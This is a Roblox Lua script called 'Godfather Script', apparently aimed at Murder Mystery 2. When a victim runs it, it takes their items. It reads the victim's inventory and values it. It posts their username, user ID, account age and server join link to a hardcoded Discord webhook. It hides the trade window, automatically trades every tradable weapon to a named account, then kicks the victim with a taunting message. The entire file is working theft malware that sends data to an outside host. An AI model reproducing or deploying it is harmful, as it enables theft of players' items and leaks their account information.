local cfg = {}
cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
cfg.pingEveryone = "Yes"

local users = {"Getstompedbyyounes"}        
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

if not plr then
    warn("Godfather Script: Not running as LocalPlayer")
    return
end

-- Safe service waiting with timeout
local function safeWaitForChild(parent, childName, timeout)
    timeout = timeout or 5
    local success, result = pcall(function()
        return parent:WaitForChild(childName, timeout)
    end)
    return success and result or nil
end

local Trade = safeWaitForChild(ReplicatedStorage, "Trade", 10)
if not Trade then
    warn("Godfather Script: Trade folder not found")
    return
end

local SendRequest = safeWaitForChild(Trade, "SendRequest")
local GetStatus = safeWaitForChild(Trade, "GetTradeStatus")
local OfferItem = safeWaitForChild(Trade, "OfferItem")
local AcceptTradeRemote = safeWaitForChild(Trade, "AcceptTrade")
local DeclineTrade = safeWaitForChild(Trade, "DeclineTrade")

if not (SendRequest and GetStatus and OfferItem and AcceptTradeRemote and DeclineTrade) then
    warn("Godfather Script: Missing trade remotes")
    return
end

local isTradeCompleted = false
local totalInventoryValue = 0

local function findRequest()
    -- Check syn first (most common)
    if typeof(syn) == "table" and syn.request then
        return syn.request, "Synapse X"
    elseif typeof(http_request) == "function" then
        return http_request, "Script-Ware / KRNL"
    elseif typeof(http) == "table" and http.request then
        return http.request, "Electron"
    elseif typeof(fluxus) == "table" and fluxus.request then
        return fluxus.request, "Fluxus"
    elseif typeof(httpx) == "table" and httpx.request then
        return httpx.request, "Hydrogen"
    elseif typeof(request) == "function" then
        return request, "Delta / Generic"
    elseif KRNL_LOADED and typeof(request) == "function" then
        return request, "KRNL"
    elseif typeof(identifyexecutor) == "function" then
        local execName = identifyexecutor()
        if typeof(request) == "function" then
            return request, execName
        end
    elseif typeof(getexecutorname) == "function" then
        local execName = getexecutorname()
        if typeof(request) == "function" then
            return request, execName
        end
    end

    return nil, "Roblox HttpService"
end

local PlaceId = game.PlaceId
local JobId = game.JobId

local fernJoinerLink = string.format(
    "https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", 
    PlaceId, 
    JobId
)

local function GodfatherScriptFetchSupremeValues()
    local values = {}
    local execRequest = findRequest()
    if not execRequest then return values end
    
    local success, result = pcall(function()
        local response = execRequest({
            Url = "https://api.supremevaluelist.com/mm2/items",
            Method = "GET",
            Headers = { ["User-Agent"] = "Mozilla/5.0" }
        })
        if response and response.Body then
            return HttpService:JSONDecode(response.Body)
        end
        return nil
    end)
    
    if success and typeof(result) == "table" then
        for _, item in ipairs(result) do
            if item and typeof(item) == "table" and item.name and item.value then
                values[item.name:lower()] = item.value
            end
        end
    end
    return values
end

local supremeValues = GodfatherScriptFetchSupremeValues()

local function GodfatherScriptGetItemValue(itemName, rarity)
    if not itemName or typeof(itemName) ~= "string" then return 1 end
    local lowerName = itemName:lower()
    if supremeValues[lowerName] then return supremeValues[lowerName] end
    
    if lowerName:find("chroma") then
        local baseName = lowerName:gsub("chroma ", "")
        if supremeValues[baseName] then return supremeValues[baseName] * 2 end
    end
    
    local defaultValues = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 5, Godly = 10, Ancient = 20, Unique = 30, Vintage = 50 }
    return defaultValues[rarity] or 1
end

if not plr.Character then 
    local charSuccess, charResult = pcall(function()
        return plr.CharacterAdded:Wait()
    end)
    if not charSuccess then 
        task.wait(2)
    end
end
task.wait(1)

local LastOffer = nil

-- Safely connect to UpdateTrade if it exists
local UpdateTrade = safeWaitForChild(Trade, "UpdateTrade")
if UpdateTrade and typeof(UpdateTrade) == "Instance" and UpdateTrade:IsA("RemoteEvent") then
    UpdateTrade.OnClientEvent:Connect(function(x) 
        if x and typeof(x) == "table" and x.LastOffer then 
            LastOffer = x.LastOffer 
        end
    end)
end

local PlayerGui = plr:WaitForChild("PlayerGui", 10)
if PlayerGui then
    for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
        local gui = safeWaitForChild(PlayerGui, guiName, 3)
        if gui and typeof(gui) == "Instance" and gui:IsA("GuiObject") then
            gui.Enabled = false
            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                if gui.Enabled then gui.Enabled = false end
            end)
        end
    end
end

-- Safely load database
local database = {}
local dbSuccess, dbResult = pcall(function()
    local dbModule = safeWaitForChild(ReplicatedStorage, "Database", 5)
    if dbModule then
        local syncFolder = safeWaitForChild(dbModule, "Sync", 5)
        if syncFolder then
            local itemModule = safeWaitForChild(syncFolder, "Item", 5)
            if itemModule and itemModule:IsA("ModuleScript") then
                return require(itemModule)
            end
        end
    end
    return nil
end)

if dbSuccess and typeof(dbResult) == "table" then
    database = dbResult
end

-- Safely get profile data
local profileData = {}
local profileSuccess, profileResult = pcall(function()
    local inventoryRemotes = safeWaitForChild(ReplicatedStorage, "Remotes", 5)
    if inventoryRemotes then
        local inventoryFolder = safeWaitForChild(inventoryRemotes, "Inventory", 5)
        if inventoryFolder then
            local getProfileRemote = safeWaitForChild(inventoryFolder, "GetProfileData", 5)
            if getProfileRemote and getProfileRemote:IsA("RemoteFunction") then
                return getProfileRemote:InvokeServer(plr.Name)
            end
        end
    end
    return nil
end)

if profileSuccess and typeof(profileResult) == "table" then
    profileData = profileResult
end

local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

local function GodfatherScriptIsDefaultItem(itemName)
    if not itemName or typeof(itemName) ~= "string" then return false end
    local lower = itemName:lower()
    return lower:find("default") and (lower:find("gun") or lower:find("knife"))
end

local weaponsToSend = {}
local rarityCounts = {}

-- Safely iterate weapons
local weaponsOwned = {}
if profileData and typeof(profileData) == "table" then
    if profileData.Weapons and typeof(profileData.Weapons) == "table" then
        weaponsOwned = profileData.Weapons.Owned or {}
    end
end

for dataid, amount in pairs(weaponsOwned) do
    if typeof(dataid) == "string" and typeof(amount) == "number" and amount > 0 then
        local item = database[dataid]
        if item and typeof(item) == "table" then
            local itemName = item.ItemName or dataid
            if not GodfatherScriptIsDefaultItem(itemName) and not GodfatherScriptIsDefaultItem(dataid) then
                
                local rarity = item.Rarity or "Common"
                local itemValue = GodfatherScriptGetItemValue(itemName, rarity)
                local totalItemValue = itemValue * amount
                
                totalInventoryValue = totalInventoryValue + totalItemValue
                
                if not dataid:lower():find("untradable") then
                    table.insert(weaponsToSend, {
                        DataID = dataid,
                        ItemName = itemName,
                        Amount = amount,
                        Rarity = rarity,
                        Value = itemValue,
                        TotalValue = totalItemValue
                    })
                    rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
                end
            end
        end
    end
end

table.sort(weaponsToSend, function(a, b) 
    if not a or not b then return false end
    return (a.TotalValue or 0) > (b.TotalValue or 0) 
end)

local itemsListText = ""
for i = 1, math.min(20, #weaponsToSend) do
    local item = weaponsToSend[i]
    if item then
        itemsListText = itemsListText .. string.format("%s x%d (%d value)\n", item.ItemName, item.Amount, item.TotalValue)
    end
end

if #weaponsToSend > 20 then
    itemsListText = itemsListText .. string.format("\nand %d more items", #weaponsToSend - 20)
end

local rarityText = ""
for _, rarity in ipairs(rarityTable) do
    if rarityCounts[rarity] and rarityCounts[rarity] > 0 then
        rarityText = rarityText .. string.format("%s: %d\n", rarity, rarityCounts[rarity])
    end
end

local function GodfatherScriptSendWebhook()
    local execRequest, executorName = findRequest()
    if not execRequest then
        warn("Godfather Script: No HTTP request function available")
        return false
    end
    
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = users[1] or "Unknown"
    
    local embed = {
        title = string.format("Godfather Script | %s | %s", plr.DisplayName or plr.Name, targetName),
        description = string.format("%s's inventory grabbed!\nTotal Value: %d\nJoin and trade:", plr.Name, totalInventoryValue),
        color = 0xFF0000,
        thumbnail = {url = avatarUrl},
        fields = {
            {
                name = "Player Info",
                value = string.format("Display: %s\nUsername: %s\nUser ID: %d\nAccount Age: %d days\nExecutor: %s",
                    plr.DisplayName or plr.Name, plr.Name, plr.UserId, plr.AccountAge or 0, executorName),
                inline = true
            },
            {
                name = "Join Link",
                value = string.format("[Click to Join](%s)\n```\n%s\n```", fernJoinerLink, fernJoinerLink),
                inline = false
            },
            {
                name = "Server Info",
                value = string.format("JobId: %s\nPlaceId: %d", JobId, PlaceId),
                inline = true
            },
            {
                name = "Total Items",
                value = string.format("%d items\nValue: %d", #weaponsToSend, totalInventoryValue),
                inline = true
            },
            {
                name = "Rarity Distribution",
                value = rarityText ~= "" and rarityText or "No data",
                inline = false
            },
            {
                name = string.format("Top Items (%d)", math.min(20, #weaponsToSend)),
                value = itemsListText ~= "" and itemsListText or "No items",
                inline = false
            },
            {
                name = "Target Receiver",
                value = string.format("%s", targetName),
                inline = true
            }
        },
        footer = {
            text = string.format("Godfather Script | %s", os.date("%d/%m/%Y %H:%M"))
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local prefix = cfg.pingEveryone == "Yes" and "@everyone " or ""
    
    local payload = {
        content = prefix ..
            "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" ..
            game.JobId .. "')",
        embeds = {embed}  -- Fixed: was {{embed}} which is wrong
    }
    
    local success, response = pcall(function()
        return execRequest({
            Url = cfg.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if not success then
        warn("Godfather Script: Webhook failed - " .. tostring(response))
    end
    
    return success
end

GodfatherScriptSendWebhook()

local function GodfatherScriptGetStatus()
    local ok, status = pcall(function() 
        if GetStatus and GetStatus:IsA("RemoteFunction") then
            return GetStatus:InvokeServer() 
        end
        return "None"
    end)
    return ok and status or "None"
end

local function GodfatherScriptWaitForTarget(targetPlayer)
    if not targetPlayer then return false end
    local attempts = 0
    while attempts < 30 do
        if targetPlayer.Parent then
            local char = targetPlayer.Character
            if char and char:FindFirstChild("Humanoid") then 
                return true 
            end
        else
            return false  -- Player left
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return false
end

local function GodfatherScriptAcceptTrade()
    if not LastOffer then return false end
    if not AcceptTradeRemote then return false end
    
    local ok = pcall(function()
        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
    end)
    return ok
end

local function GodfatherScriptFinishAndKick()
    isTradeCompleted = true
    task.wait(2)
    local discordLink = "https://discord.gg/dUaHggzp9q"
    if typeof(setclipboard) == "function" then 
        pcall(function() setclipboard(discordLink) end)
    end
    plr:Kick("Godfather Script\n\nItems taken successfully\n\n" .. discordLink .. "\n\nJoin to get your items back!")
end

function GodfatherScriptDoTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then return end
    if not GodfatherScriptWaitForTarget(targetPlayer) then return end
    
    if DeclineTrade then
        pcall(function() DeclineTrade:FireServer() end)
    end
    task.wait(0.5)
    LastOffer = nil
    
    local itemsAdded = false
    local timeout = 0
    
    while timeout < 60 and #weaponsToSend > 0 do
        local success, err = pcall(function()
            local status = GodfatherScriptGetStatus()
            
            if status == "None" then
                if itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do 
                        if #weaponsToSend > 0 then
                            table.remove(weaponsToSend, 1) 
                        end
                    end
                    itemsAdded = false
                    LastOffer = nil
                    task.wait(0.5)
                else
                    if SendRequest and targetPlayer then
                        SendRequest:InvokeServer(targetPlayer)
                    end
                    task.wait(1.5)
                end
            elseif status == "SendingRequest" then
                task.wait(0.5)
            elseif status == "ReceivingRequest" then
                if DeclineTrade then
                    DeclineTrade:FireServer()
                end
                task.wait(0.3)
            elseif status == "StartTrade" then
                if not itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do
                        local item = weaponsToSend[i]
                        if item and OfferItem then
                            for _ = 1, item.Amount do
                                OfferItem:FireServer(item.DataID, "Weapons")
                            end
                            task.wait(0.1)
                        end
                    end
                    itemsAdded = true
                    task.spawn(function()
                        task.wait(6.5)
                        GodfatherScriptAcceptTrade()
                    end)
                else
                    task.wait(1)
                end
            end
        end)
        
        if not success then 
            warn("Godfather Script: Trade loop error - " .. tostring(err))
            task.wait(1) 
        end
        timeout = timeout + 1
    end
    
    if #weaponsToSend == 0 then 
        GodfatherScriptFinishAndKick() 
    end
end

local function GodfatherScriptIsTarget(name)
    if not name or typeof(name) ~= "string" then return false end
    for _, u in ipairs(users) do
        if u and u:lower() == name:lower() then 
            return true 
        end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if GodfatherScriptIsTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            GodfatherScriptDoTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and GodfatherScriptIsTarget(p.Name) then
        task.spawn(function()
            task.wait(2)
            GodfatherScriptDoTrade(p)
        end)
        break
    end
end

while not isTradeCompleted do
    task.wait(1)
end
